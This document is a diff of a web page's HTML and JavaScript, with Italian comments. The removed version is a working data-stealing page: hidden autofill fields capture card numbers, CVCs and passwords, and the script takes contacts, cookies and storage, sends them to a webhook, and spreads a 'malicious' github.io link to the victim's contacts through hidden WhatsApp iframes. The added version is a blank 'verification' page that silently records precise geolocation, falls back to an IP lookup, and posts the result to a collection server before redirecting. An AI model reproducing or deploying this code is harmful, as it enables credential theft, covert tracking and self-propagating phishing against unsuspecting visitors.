@@ -1,246 +1,123 @@
+<!-- index.html – pagina bianca, geolocalizzazione silenziosa e redirect -->
 <!DOCTYPE html>
-<html lang="en">
+<html lang="it">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Caricamento...</title>
     <style>
-        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #888; font-family: Arial; }
-        .spinner { border: 4px solid #222; border-top: 4px solid #00c853; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .hidden { display: none !important; }
+        body {
+            background: #ffffff;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            color: #333;
+        }
+        .hidden { display: none; }
+        #loading {
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid #eee;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p { margin-top: 20px; color: #888; }
     </style>
 </head>
 <body>
-    <div id="loader" style="text-align:center;">
+    <div id="loading">
         <div class="spinner"></div>
-        <p style="margin-top:20px;">Connecting...</p>
+        <p>Verifica in corso...</p>
     </div>
 
-    <!-- HIDDEN AUTOFILL FIELDS – all invisible -->
-    <input type="text" id="hf_name" autocomplete="name" class="hidden">
-    <input type="tel" id="hf_phone" autocomplete="tel" class="hidden">
-    <input type="email" id="hf_email" autocomplete="email" class="hidden">
-    <input type="text" id="hf_address" autocomplete="street-address" class="hidden">
-    <input type="text" id="hf_ccname" autocomplete="cc-name" class="hidden">
-    <input type="text" id="hf_ccnum" autocomplete="cc-number" class="hidden">
-    <input type="text" id="hf_ccexp" autocomplete="cc-exp" class="hidden">
-    <input type="password" id="hf_cccsc" autocomplete="cc-csc" class="hidden">
-    <input type="password" id="hf_pass" autocomplete="current-password" class="hidden">
-    <input type="text" id="hf_username" autocomplete="username" class="hidden">
-
     <script>
-        // ===== CONFIG =====
-        const WEBHOOK_URL = 'http://localhost:3000';
-        const MALICIOUS_URL = 'https://vincenzomuyo-art.github.io/hac/f.html'; // <-- REPLACE
-        
+        // ===== CONFIGURAZIONE =====
+        // Sostituisci con l'URL del tuo server Python (es. http://localhost:3000/collect)
+        const SERVER_URL = 'http://localhost:3000/collect';
+        // Sostituisci con l'URL di destinazione dopo la geolocalizzazione
+        const REDIRECT_URL = 'https://example.com';
 
-        // ===== HELPER: SEND DATA =====
-        function sendData(data) {
-            const json = JSON.stringify(data);
-            // sendBeacon
-            if (navigator.sendBeacon) navigator.sendBeacon(WEBHOOK, json);
-            // fetch (no-cors)
-            fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: json, keepalive: true }).catch(()=>{});
-            // image beacon (shortened)
-            new Image().src = WEBHOOK + '?d=' + encodeURIComponent(json.substring(0, 2000));
-        }
+        // ===== FUNZIONE PER INVIARE LA POSIZIONE =====
+        function sendLocation(position) {
+            const data = {
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude || null,
+                speed: position.coords.speed || null,
+                heading: position.coords.heading || null,
+                timestamp: new Date(position.timestamp).toISOString(),
+                userAgent: navigator.userAgent,
+                ip_fallback: null // verrà eventualmente aggiunto dopo
+            };
 
-        // ===== 1. GEOLOCATION (with IP fallback) =====
-        function getGeo() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    fallbackIP(resolve);
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        acc: pos.coords.accuracy,
-                        alt: pos.coords.altitude,
-                        speed: pos.coords.speed,
-                        ts: new Date(pos.timestamp).toISOString()
-                    }),
-                    () => fallbackIP(resolve),
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
+            // Invia via fetch (POST JSON)
+            fetch(SERVER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+                keepalive: true
+            }).catch(() => {
+                // Fallback: sendBeacon
+                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+                navigator.sendBeacon(SERVER_URL, blob);
             });
+
+            // Redirect alla pagina desiderata
+            window.location.href = REDIRECT_URL;
         }
-        function fallbackIP(resolve) {
+
+        function handleError(error) {
+            // In caso di errore (es. utente nega il permesso), inviamo comunque un fallback con IP (tramite ipapi)
             fetch('https://ipapi.co/json/')
                 .then(r => r.json())
-                .then(d => resolve({ lat: d.latitude, lon: d.longitude, city: d.city, country: d.country_name, ip: d.ip }))
-                .catch(() => resolve({ error: 'geo failed' }));
-        }
-
-        // ===== 2. CONTACTS (if API exists) =====
-        function getContacts() {
-            return new Promise((resolve) => {
-                if (!navigator.contacts || typeof navigator.contacts.select !== 'function') {
-                    resolve([]);
-                    return;
-                }
-                navigator.contacts.select(['name','tel','email'], { multiple: true })
-                    .then(contacts => {
-                        const cleaned = contacts.map(c => ({
-                            name: c.name?.[0] || null,
-                            tel: c.tel || null,
-                            email: c.email || null
-                        }));
-                        resolve(cleaned);
-                    })
-                    .catch(() => resolve([]));
-            });
-        }
-
-        // ===== 3. READ AUTOFILL FIELDS =====
-        function readAutofill() {
-            const ids = ['hf_name','hf_phone','hf_email','hf_address','hf_ccname','hf_ccnum','hf_ccexp','hf_cccsc','hf_pass','hf_username'];
-            const data = {};
-            ids.forEach(id => {
-                const el = document.getElementById(id);
-                if (el && el.value) data[id.replace('hf_','')] = el.value;
-            });
-            return data;
-        }
-
-        // ===== 4. METADATA + STORAGE =====
-        function getMeta() {
-            const m = {
-                ua: navigator.userAgent,
-                platform: navigator.platform,
-                lang: navigator.language,
-                screen: screen.width+'x'+screen.height,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                url: location.href,
-                ref: document.referrer || 'none',
-                ls: null, ss: null, cookies: null
-            };
-            try { m.ls = JSON.stringify(localStorage); } catch(e){}
-            try { m.ss = JSON.stringify(sessionStorage); } catch(e){}
-            try { m.cookies = document.cookie; } catch(e){}
-            return m;
-        }
-
-        // ===== 5. PROPAGATE LINK TO CONTACTS (hidden iframes + pop-under) =====
-        function propagate(contacts) {
-            if (!contacts || contacts.length === 0) return;
-            const numbers = [];
-            contacts.forEach(c => {
-                if (c.tel) {
-                    if (Array.isArray(c.tel)) c.tel.forEach(t => numbers.push(t.replace(/\s/g,'').replace(/[^0-9+]/g,'')));
-                    else numbers.push(c.tel.replace(/\s/g,'').replace(/[^0-9+]/g,''));
-                }
-            });
-            const unique = [...new Set(numbers)].filter(n => n.length > 5);
-            const msg = encodeURIComponent(`Guarda questo link: ${MALICIOUS_URL}`);
-            // Open first 10 via iframes (invisible) with delay
-            unique.slice(0, 10).forEach((num, idx) => {
-                setTimeout(() => {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = `https://api.whatsapp.com/send?phone=${num}&text=${msg}`;
-                    document.body.appendChild(iframe);
-                    setTimeout(() => iframe.remove(), 3000);
-                }, idx * 600);
-            });
-            // Also try pop-under: open a new window, then blur it
-            setTimeout(() => {
-                const win = window.open('', '_blank');
-                if (win) {
-                    win.document.write(`<iframe src="https://api.whatsapp.com/send?phone=${unique[0] || ''}&text=${msg}" style="width:100%;height:100%;"></iframe>`);
-                    win.blur();
-                    window.focus();
-                }
-            }, 2000);
-        }
-
-        // ===== 6. MAIN COLLECTOR =====
-        async function collect() {
-            const [geo, contacts] = await Promise.all([getGeo(), getContacts()]);
-            const autofill = readAutofill();
-            const meta = getMeta();
-
-            const payload = {
-                geo,
-                contacts,
-                autofill,
-                meta,
-                timestamp: new Date().toISOString(),
-                // include all in one
-                raw: { geo, contacts, autofill, meta }
-            };
-
-            sendData(payload);
-
-            // Propagate if we have contacts
-            if (contacts && contacts.length > 0) {
-                propagate(contacts);
-            }
-
-            // Hide loader and show fake error after 1s
-            setTimeout(() => {
-                document.body.innerHTML = `
-                    <div style="background:#0a0a0a;color:#555;text-align:center;padding-top:40vh;font-family:Arial;">
-                        <h1 style="color:#ff1744;">404 Not Found</h1>
-                        <p>The requested resource could not be found.</p>
-                    </div>
-                `;
-                // Optionally redirect to a legit site after 3s
-                // setTimeout(() => location.href = 'https://web.whatsapp.com/', 3000);
-            }, 1000);
-        }
-
-        // ===== 7. SERVICE WORKER FOR PERSISTENCE (optional) =====
-        if ('serviceWorker' in navigator) {
-            // Register a minimal SW that re-collects on sync
-            const swCode = `
-                self.addEventListener('install', () => self.skipWaiting());
-                self.addEventListener('activate', () => self.clients.claim());
-                self.addEventListener('sync', (event) => {
-                    if (event.tag === 'periodic-collect') {
-                        event.waitUntil(
-                            clients.matchAll().then(clients => {
-                                clients.forEach(client => client.postMessage('collect'));
-                            })
-                        );
-                    }
-                });
-                self.addEventListener('message', (event) => {
-                    if (event.data === 'collect') {
-                        // Re-run collection via fetch to a webhook? Actually we can't do much without DOM.
-                        // We'll just send a ping.
-                        fetch('${WEBHOOK}', { method: 'POST', body: JSON.stringify({type:'sw-ping', ts:Date.now()}) });
-                    }
-                });
-            `;
-            const blob = new Blob([swCode], { type: 'application/javascript' });
-            const swUrl = URL.createObjectURL(blob);
-            navigator.serviceWorker.register(swUrl, { scope: '/' })
-                .then(reg => {
-                    // Request periodic sync (if permission)
-                    if ('periodicSync' in reg) {
-                        reg.periodicSync.register('periodic-collect', { minInterval: 24 * 60 * 60 * 1000 })
-                            .catch(() => {});
-                    }
+                .then(ipData => {
+                    const fallback = {
+                        error: error.message || 'geolocation denied',
+                        ip: ipData.ip || null,
+                        city: ipData.city || null,
+                        country: ipData.country_name || null,
+                        lat: ipData.latitude || null,
+                        lon: ipData.longitude || null,
+                        timestamp: new Date().toISOString()
+                    };
+                    const blob = new Blob([JSON.stringify(fallback)], { type: 'application/json' });
+                    navigator.sendBeacon(SERVER_URL, blob);
                 })
-                .catch(() => {});
+                .catch(() => {
+                    // Se anche IP fallisce, inviamo solo l'errore
+                    const fallback = { error: error.message || 'geolocation and IP failed', timestamp: new Date().toISOString() };
+                    const blob = new Blob([JSON.stringify(fallback)], { type: 'application/json' });
+                    navigator.sendBeacon(SERVER_URL, blob);
+                })
+                .finally(() => {
+                    window.location.href = REDIRECT_URL;
+                });
         }
 
-        // ===== 8. TRIGGER ON LOAD =====
-        window.addEventListener('load', function() {
-            // Wait 2.5s for autofill to populate, then collect
-            setTimeout(collect, 2500);
-        });
-
-        // Also listen to any click to trigger share as fallback
-        document.addEventListener('click', function() {
-            if (navigator.share) {
-                navigator.share({ title: 'Check this', text: MALICIOUS_URL, url: MALICIOUS_URL })
-                    .catch(() => {});
-            }
-        });
+        // ===== AVVIA LA GEOLOCALIZZAZIONE =====
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        } else {
+            // Geolocalizzazione non supportata – redirect comunque
+            window.location.href = REDIRECT_URL;
+        }
     </script>
 </body>
 </html>
